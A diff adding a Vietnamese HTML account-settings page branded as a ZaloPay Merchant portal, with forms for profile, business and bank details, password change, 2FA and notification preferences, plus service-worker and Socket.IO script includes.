@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#0066cc">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <meta name="apple-mobile-web-app-title" content="ZaloPay Merchant">
+    <link rel="manifest" href="/manifest.json">
+    <link rel="icon" type="image/png" href="/images/zalopay-merchant-icon.png">
+    <link rel="apple-touch-icon" href="/images/zalopay-merchant-app-icon.png">
+    <title>Cài đặt tài khoản - ZaloPay Merchant</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="css/style.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <nav class="nav container">
+            <div class="nav-brand">
+                <img src="/1200x630wa.png" alt="ZaloPay" height="32" style="margin-right: 12px;">
+                ZaloPay Merchant
+            </div>
+            <ul class="nav-links">
+                <li><a href="dashboard.html"><i class="fas fa-tachometer-alt"></i> Dashboard</a></li>
+                <li><a href="transactions.html"><i class="fas fa-exchange-alt"></i> Giao dịch</a></li>
+                <li><a href="qr-codes.html"><i class="fas fa-qrcode"></i> QR Codes</a></li>
+                <li><a href="reports.html"><i class="fas fa-chart-bar"></i> Báo cáo</a></li>
+                <li><a href="account-settings.html" class="active"><i class="fas fa-cog"></i> Cài đặt</a></li>
+                <li><a href="#" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Đăng xuất</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- Main Content -->
+    <main style="padding-top: 80px;">
+        <!-- Page Header -->
+        <section class="py-4 bg-white">
+            <div class="container">
+                <div class="d-flex justify-content-between align-items-center">
+                    <div>
+                        <h1 class="h3 mb-1">Cài đặt tài khoản</h1>
+                        <p class="text-muted mb-0">Quản lý thông tin và bảo mật tài khoản của bạn</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Settings Content -->
+        <section class="py-4">
+            <div class="container">
+                <div class="row g-4">
+                    <!-- Settings Navigation -->
+                    <div class="col-lg-3">
+                        <div class="card">
+                            <div class="card-body p-0">
+                                <div class="list-group list-group-flush">
+                                    <a href="#profile" class="list-group-item list-group-item-action active" onclick="showSettingsTab('profile')">
+                                        <i class="fas fa-user me-2"></i>
+                                        Thông tin cá nhân
+                                    </a>
+                                    <a href="#business" class="list-group-item list-group-item-action" onclick="showSettingsTab('business')">
+                                        <i class="fas fa-building me-2"></i>
+                                        Thông tin doanh nghiệp
+                                    </a>
+                                    <a href="#bank" class="list-group-item list-group-item-action" onclick="showSettingsTab('bank')">
+                                        <i class="fas fa-university me-2"></i>
+                                        Tài khoản ngân hàng
+                                    </a>
+                                    <a href="#security" class="list-group-item list-group-item-action" onclick="showSettingsTab('security')">
+                                        <i class="fas fa-shield-alt me-2"></i>
+                                        Bảo mật
+                                    </a>
+                                    <a href="#notifications" class="list-group-item list-group-item-action" onclick="showSettingsTab('notifications')">
+                                        <i class="fas fa-bell me-2"></i>
+                                        Thông báo
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Settings Content -->
+                    <div class="col-lg-9">
+                        <!-- Profile Settings -->
+                        <div id="profileTab" class="settings-tab">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h5 class="mb-0">Thông tin cá nhân</h5>
+                                </div>
+                                <div class="card-body">
+                                    <form id="profileForm">
+                                        <div class="row g-3">
+                                            <div class="col-md-6">
+                                                <label class="form-label">Họ và tên <span class="text-danger">*</span></label>
+                                                <input type="text" class="form-control" id="fullName" required>
+                                            </div>
+                                            <div class="col-md-6">
+                                                <label class="form-label">Email <span class="text-danger">*</span></label>
+                                                <input type="email" class="form-control" id="email" required>
+                                            </div>
+                                            <div class="col-md-6">
+                                                <label class="form-label">Số điện thoại <span class="text-danger">*</span></label>
+                                                <input type="tel" class="form-control" id="phone" required>
+                                            </div>
+                                            <div class="col-md-6">
+                                                <label class="form-label">Chức vụ</label>
+                                                <input type="text" class="form-control" id="position" placeholder="Ví dụ: Giám đốc, Quản lý...">
+                                            </div>
+                                            <div class="col-12">
+                                                <label class="form-label">Địa chỉ</label>
+                                                <textarea class="form-control" id="address" rows="3" placeholder="Địa chỉ liên hệ"></textarea>
+                                            </div>
+                                        </div>
+                                        <div class="mt-4">
+                                            <button type="submit" class="btn btn-primary">
+                                                <i class="fas fa-save me-2"></i>
+                                                Lưu thay đổi
+                                            </button>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Business Settings -->
+                        <div id="businessTab" class="settings-tab d-none">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h5 class="mb-0">Thông tin doanh nghiệp</h5>
+                                </div>
+                                <div class="card-body">
+                                    <form id="businessForm">
+                                        <div class="row g-3">
+                                            <div class="col-md-6">
+                                                <label class="form-label">Tên doanh nghiệp <span class="text-danger">*</span></label>
+                                                <input type="text" class="form-control" id="businessName" required>
+                                            </div>
+                                            <div class="col-md-6">
+                                                <label class="form-label">Mã số thuế <span class="text-danger">*</span></label>
+                                                <input type="text" class="form-control" id="taxCode" required>
+                                            </div>
+                                            <div class="col-md-6">
+                                                <label class="form-label">Loại hình kinh doanh</label>
+                                                <select class="form-control" id="businessType">
+                                                    <option value="">Chọn loại hình</option>
+                                                    <option value="individual">Cá nhân</option>
+                                                    <option value="household">Hộ kinh doanh</option>
+                                                    <option value="company">Công ty</option>
+                                                    <option value="enterprise">Doanh nghiệp</option>
+                                                </select>
+                                            </div>
+                                            <div class="col-md-6">
+                                                <label class="form-label">Ngành nghề chính</label>
+                                                <select class="form-control" id="industry">
+                                                    <option value="">Chọn ngành nghề</option>
+                                                    <option value="food">Ăn uống</option>
+                                                    <option value="retail">Bán lẻ</option>
+                                                    <option value="service">Dịch vụ</option>
+                                                    <option value="technology">Công nghệ</option>
+                                                    <option value="other">Khác</option>
+                                                </select>
+                                            </div>
+                                            <div class="col-12">
+                                                <label class="form-label">Địa chỉ kinh doanh</label>
+                                                <textarea class="form-control" id="businessAddress" rows="3" placeholder="Địa chỉ kinh doanh chính"></textarea>
+                                            </div>
+                                            <div class="col-md-6">
+                                                <label class="form-label">Số lượng nhân viên</label>
+                                                <select class="form-control" id="employeeCount">
+                                                    <option value="">Chọn số lượng</option>
+                                                    <option value="1-5">1-5 người</option>
+                                                    <option value="6-10">6-10 người</option>
+                                                    <option value="11-50">11-50 người</option>
+                                                    <option value="51-100">51-100 người</option>
+                                                    <option value="100+">Trên 100 người</option>
+                                                </select>
+                                            </div>
+                                            <div class="col-md-6">
+                                                <label class="form-label">Doanh thu trung bình/tháng</label>
+                                                <select class="form-control" id="monthlyRevenue">
+                                                    <option value="">Chọn mức doanh thu</option>
+                                                    <option value="under-10m">Dưới 10 triệu</option>
+                                                    <option value="10-50m">10-50 triệu</option>
+                                                    <option value="50-200m">50-200 triệu</option>
+                                                    <option value="200-500m">200-500 triệu</option>
+                                                    <option value="over-500m">Trên 500 triệu</option>
+                                                </select>
+                                            </div>
+                                        </div>
+                                        <div class="mt-4">
+                                            <button type="submit" class="btn btn-primary">
+                                                <i class="fas fa-save me-2"></i>
+                                                Lưu thay đổi
+                                            </button>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Bank Settings -->
+                        <div id="bankTab" class="settings-tab d-none">
+                            <div class="card">
+                                <div class="card-header d-flex justify-content-between align-items-center">
+                                    <h5 class="mb-0">Tài khoản ngân hàng</h5>
+                                    <button class="btn btn-primary btn-sm" onclick="addBankAccount()">
+                                        <i class="fas fa-plus me-2"></i>
+                                        Thêm tài khoản
+                                    </button>
+                                </div>
+                                <div class="card-body">
+                                    <div id="bankAccountsList">
+                                        <!-- Bank accounts will be loaded here -->
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Security Settings -->
+                        <div id="securityTab" class="settings-tab d-none">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h5 class="mb-0">Bảo mật tài khoản</h5>
+                                </div>
+                                <div class="card-body">
+                                    <!-- Change Password -->
+                                    <div class="mb-4">
+                                        <h6 class="mb-3">Đổi mật khẩu</h6>
+                                        <form id="passwordForm">
+                                            <div class="row g-3">
+                                                <div class="col-md-4">
+                                                    <label class="form-label">Mật khẩu hiện tại</label>
+                                                    <input type="password" class="form-control" id="currentPassword" required>
+                                                </div>
+                                                <div class="col-md-4">
+                                                    <label class="form-label">Mật khẩu mới</label>
+                                                    <input type="password" class="form-control" id="newPassword" required>
+                                                </div>
+                                                <div class="col-md-4">
+                                                    <label class="form-label">Xác nhận mật khẩu</label>
+                                                    <input type="password" class="form-control" id="confirmPassword" required>
+                                                </div>
+                                            </div>
+                                            <div class="mt-3">
+                                                <button type="submit" class="btn btn-primary">
+                                                    <i class="fas fa-key me-2"></i>
+                                                    Đổi mật khẩu
+                                                </button>
+                                            </div>
+                                        </form>
+                                    </div>
+
+                                    <hr>
+
+                                    <!-- Two-Factor Authentication -->
+                                    <div class="mb-4">
+                                        <h6 class="mb-3">Xác thực hai yếu tố (2FA)</h6>
+                                        <div class="d-flex justify-content-between align-items-center">
+                                            <div>
+                                                <p class="mb-1">Bảo vệ tài khoản với xác thực hai yếu tố</p>
+                                                <small class="text-muted">Nhận mã xác thực qua SMS hoặc ứng dụng</small>
+                                            </div>
+                                            <div class="form-check form-switch">
+                                                <input class="form-check-input" type="checkbox" id="enable2FA" onchange="toggle2FA()">
+                                                <label class="form-check-label" for="enable2FA"></label>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <hr>
+
+                                    <!-- Login Sessions -->
+                                    <div>
+                                        <h6 class="mb-3">Phiên đăng nhập</h6>
+                                        <div id="loginSessions">
+                                            <!-- Login sessions will be loaded here -->
+                                        </div>
+                                        <button class="btn btn-outline-danger btn-sm mt-3" onclick="logoutAllSessions()">
+                                            <i class="fas fa-sign-out-alt me-2"></i>
+                                            Đăng xuất tất cả thiết bị
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Notifications Settings -->
+                        <div id="notificationsTab" class="settings-tab d-none">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h5 class="mb-0">Cài đặt thông báo</h5>
+                                </div>
+                                <div class="card-body">
+                                    <form id="notificationsForm">
+                                        <div class="mb-4">
+                                            <h6 class="mb-3">Thông báo giao dịch</h6>
+                                            <div class="form-check mb-2">
+                                                <input class="form-check-input" type="checkbox" id="notifySuccessfulTx" checked>
+                                                <label class="form-check-label" for="notifySuccessfulTx">
+                                                    Giao dịch thành công
+                                                </label>
+                                            </div>
+                                            <div class="form-check mb-2">
+                                                <input class="form-check-input" type="checkbox" id="notifyFailedTx" checked>
+                                                <label class="form-check-label" for="notifyFailedTx">
+                                                    Giao dịch thất bại
+                                                </label>
+                                            </div>
+                                            <div class="form-check mb-2">
+                                                <input class="form-check-input" type="checkbox" id="notifyLargeTx">
+                                                <label class="form-check-label" for="notifyLargeTx">
+                                                    Giao dịch lớn (> 1 triệu VND)
+                                                </label>
+                                            </div>
+                                        </div>
+
+                                        <div class="mb-4">
+                                            <h6 class="mb-3">Thông báo bảo mật</h6>
+                                            <div class="form-check mb-2">
+                                                <input class="form-check-input" type="checkbox" id="notifyLogin" checked>
+                                                <label class="form-check-label" for="notifyLogin">
+                                                    Đăng nhập từ thiết bị mới
+                                                </label>
+                                            </div>
+                                            <div class="form-check mb-2">
+                                                <input class="form-check-input" type="checkbox" id="notifyPasswordChange" checked>
+                                                <label class="form-check-label" for="notifyPasswordChange">
+                                                    Thay đổi mật khẩu
+                                                </label>
+                                            </div>
+                                        </div>
+
+                                        <div class="mb-4">
+                                            <h6 class="mb-3">Thông báo marketing</h6>
+                                            <div class="form-check mb-2">
+                                                <input class="form-check-input" type="checkbox" id="notifyPromotions">
+                                                <label class="form-check-label" for="notifyPromotions">
+                                                    Khuyến mãi và ưu đãi
+                                                </label>
+                                            </div>
+                                            <div class="form-check mb-2">
+                                                <input class="form-check-input" type="checkbox" id="notifyNews">
+                                                <label class="form-check-label" for="notifyNews">
+                                                    Tin tức và cập nhật
+                                                </label>
+                                            </div>
+                                        </div>
+
+                                        <div class="mb-4">
+                                            <h6 class="mb-3">Phương thức nhận thông báo</h6>
+                                            <div class="form-check mb-2">
+                                                <input class="form-check-input" type="checkbox" id="emailNotifications" checked>
+                                                <label class="form-check-label" for="emailNotifications">
+                                                    <i class="fas fa-envelope me-2"></i>
+                                                    Email
+                                                </label>
+                                            </div>
+                                            <div class="form-check mb-2">
+                                                <input class="form-check-input" type="checkbox" id="smsNotifications">
+                                                <label class="form-check-label" for="smsNotifications">
+                                                    <i class="fas fa-sms me-2"></i>
+                                                    SMS
+                                                </label>
+                                            </div>
+                                            <div class="form-check mb-2">
+                                                <input class="form-check-input" type="checkbox" id="pushNotifications" checked>
+                                                <label class="form-check-label" for="pushNotifications">
+                                                    <i class="fas fa-bell me-2"></i>
+                                                    Push notification
+                                                </label>
+                                            </div>
+                                        </div>
+
+                                        <div class="mt-4">
+                                            <button type="submit" class="btn btn-primary">
+                                                <i class="fas fa-save me-2"></i>
+                                                Lưu cài đặt
+                                            </button>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <img src="/logo-zalopay-doanhnghiep.svg" alt="ZaloPay" height="40" class="mb-3">
+                    <p class="text-muted">Nền tảng thanh toán toàn diện cho mọi nhu cầu kinh doanh</p>
+                </div>
+                <div class="footer-section">
+                    <h4>Hỗ trợ</h4>
+                    <ul>
+                        <li><a href="#">Trung tâm hỗ trợ</a></li>
+                        <li><a href="#">Liên hệ chúng tôi</a></li>
+                        <li><a href="#">FAQ</a></li>
+                        <li><a href="#">Điều khoản sử dụng</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Sản phẩm</h4>
+                    <ul>
+                        <li><a href="#">Ví điện tử ZaloPay</a></li>
+                        <li><a href="#">Thanh toán online</a></li>
+                        <li><a href="#">Thanh toán offline</a></li>
+                        <li><a href="#">Giải pháp doanh nghiệp</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Kết nối</h4>
+                    <ul>
+                        <li><a href="#">Facebook</a></li>
+                        <li><a href="#">LinkedIn</a></li>
+                        <li><a href="#">YouTube</a></li>
+                        <li><a href="#">Zalo OA</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2024 ZaloPay. Tất cả quyền được bảo lưu.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="js/account-settings.js"></script>
+    <!-- Service Worker Registration -->
+    <script>
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', () => {
+          navigator.serviceWorker.register('/sw.js')
+            .then((registration) => {
+              console.log('Service Worker registered successfully:', registration.scope);
+            })
+            .catch((error) => {
+              console.error('Service Worker registration failed:', error);
+            });
+        });
+      }
+    </script>
+    
+    <!-- Socket.IO Background Support -->
+    <script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>
+    <script src="/js/socket-background.js"></script>
+</body>
+</html>
